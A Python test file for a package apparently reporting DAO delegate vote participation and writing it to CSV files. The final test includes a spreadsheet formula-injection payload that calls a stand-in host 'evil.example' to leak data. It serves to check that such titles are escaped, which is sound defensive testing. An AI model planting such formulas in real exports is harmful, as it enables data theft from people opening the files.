"""Tests for outputs — the participation table and the CSV writers."""

from datetime import date

import pandas as pd

from ad_voting_metrics.ballot import Ballot
from ad_voting_metrics.outputs import PARTICIPATION_METADATA_COLUMNS, build_participation_dataframe, write_csvs
from ad_voting_metrics.roster import Delegate

_ADDR_A = "0x" + "a" * 40
_ADDR_B = "0x" + "b" * 40
_ADDR_C = "0x" + "c" * 40


def _delegate(name: str, address: str) -> Delegate:
    return Delegate(name=name, vote_delegate_address=address, start_date=date(2025, 12, 1))


def _poll(poll_id: str, start: date, end: date, title: str) -> Ballot:
    return Ballot(id=poll_id, kind="poll", start=start, end=end, title=title)


def _spell(address: str, start: date, title: str) -> Ballot:
    return Ballot(id=address, kind="spell", start=start, end=None, title=title)


_DELEGATES = [_delegate("BLUE", _ADDR_A), _delegate("Cloaky", _ADDR_B), _delegate("BONAPUBLICA", _ADDR_C)]
_POLL_1 = _poll("12345", date(2026, 4, 5), date(2026, 4, 7), "Approve SubDAO X")
_POLL_2 = _poll("67890", date(2026, 4, 12), date(2026, 4, 14), "Adjust risk")
_SPELL = _spell("0xspell001", date(2026, 4, 20), "Spell: April risk adjustment")
_BALLOTS = [_POLL_1, _POLL_2, _SPELL]
_STATUSES = {
    (_ADDR_A, "12345"): "Yes",
    (_ADDR_B, "12345"): "No",
    (_ADDR_C, "12345"): "Yes",
    (_ADDR_A, "67890"): "Pending verification",
    (_ADDR_B, "67890"): "Yes",
    (_ADDR_C, "67890"): "Yes",
    (_ADDR_A, "0xspell001"): "Yes",
    (_ADDR_B, "0xspell001"): "No Delegated SKY",
    (_ADDR_C, "0xspell001"): "Yes",
}


# ---------------------------------------------------------------------------
# build_participation_dataframe
# ---------------------------------------------------------------------------


def test_build_participation_dataframe_one_row_per_ballot_with_metadata_then_delegates():
    out = build_participation_dataframe(_DELEGATES, _BALLOTS, _STATUSES)

    assert list(out.columns) == [*PARTICIPATION_METADATA_COLUMNS, "BLUE", "Cloaky", "BONAPUBLICA"]
    assert len(out) == 3
    row = out[out["Poll Id"] == "12345"].iloc[0]
    assert row["Start Date"] == "2026-04-05"
    assert row["End Date"] == "2026-04-07"
    assert row["Title"] == "Approve SubDAO X"
    assert (row["BLUE"], row["Cloaky"], row["BONAPUBLICA"]) == ("Yes", "No", "Yes")


def test_build_participation_dataframe_spell_row_has_blank_end_date():
    out = build_participation_dataframe(_DELEGATES, _BALLOTS, _STATUSES)

    row = out[out["Poll Id"] == "0xspell001"].iloc[0]
    assert row["Start Date"] == "2026-04-20"
    assert row["End Date"] == ""
    assert row["Title"] == "Spell: April risk adjustment"
    assert row["Cloaky"] == "No Delegated SKY"


def test_build_participation_dataframe_missing_status_is_blank():
    statuses = {k: v for k, v in _STATUSES.items() if k != (_ADDR_B, "12345")}

    row = build_participation_dataframe(_DELEGATES, _BALLOTS, statuses).iloc[0]

    assert row["Cloaky"] == ""
    assert row["BLUE"] == "Yes"


def test_build_participation_dataframe_sorts_by_start_date_keeping_input_order_for_ties():
    """Rows come out chronologically regardless of input order; same-day ballots keep their given order."""
    same_day_spell = _spell("0xspell002", _POLL_1.start, "Same day as poll 1")
    ballots = [_SPELL, same_day_spell, _POLL_2, _POLL_1]

    out = build_participation_dataframe(_DELEGATES, ballots, _STATUSES)

    assert list(out["Poll Id"]) == ["0xspell002", "12345", "67890", "0xspell001"]


def test_build_participation_dataframe_zero_ballots_returns_header_only():
    out = build_participation_dataframe(_DELEGATES[:2], [], {})

    assert list(out.columns) == [*PARTICIPATION_METADATA_COLUMNS, "BLUE", "Cloaky"]
    assert len(out) == 0


# ---------------------------------------------------------------------------
# write_csvs
# ---------------------------------------------------------------------------


def _daily():
    return pd.DataFrame([{"contract": _ADDR_A, "name": "BLUE", "date": date(2026, 4, 1), "sky": 100.0, "rank": 1}])


def test_write_csvs_creates_the_directory_and_writes_both_files(tmp_path):
    out_dir = tmp_path / "2026-04"

    result = write_csvs(out_dir, _daily(), _DELEGATES, _BALLOTS, _STATUSES)

    assert [p.relative_to(tmp_path).as_posix() for p in result] == ["2026-04/sky.csv", "2026-04/vote_participation.csv"]
    assert all(p.exists() for p in result)
    assert (out_dir / "sky.csv").read_text().splitlines()[0] == "contract,name,date,sky,rank"
    participation = pd.read_csv(out_dir / "vote_participation.csv", dtype=str, keep_default_na=False)
    assert list(participation["Poll Id"]) == ["12345", "67890", "0xspell001"]


def test_write_csvs_defuses_formula_like_titles(tmp_path):
    """API-sourced titles starting with a formula character are quoted so spreadsheet apps render them as text."""
    hostile = _poll("12345", date(2026, 4, 5), date(2026, 4, 7), '=IMPORTDATA("https://evil.example/leak")')

    write_csvs(tmp_path, _daily(), _DELEGATES, [hostile], _STATUSES)

    participation = (tmp_path / "vote_participation.csv").read_text()
    assert "'=IMPORTDATA" in participation
    assert '"=IMPORTDATA' not in participation
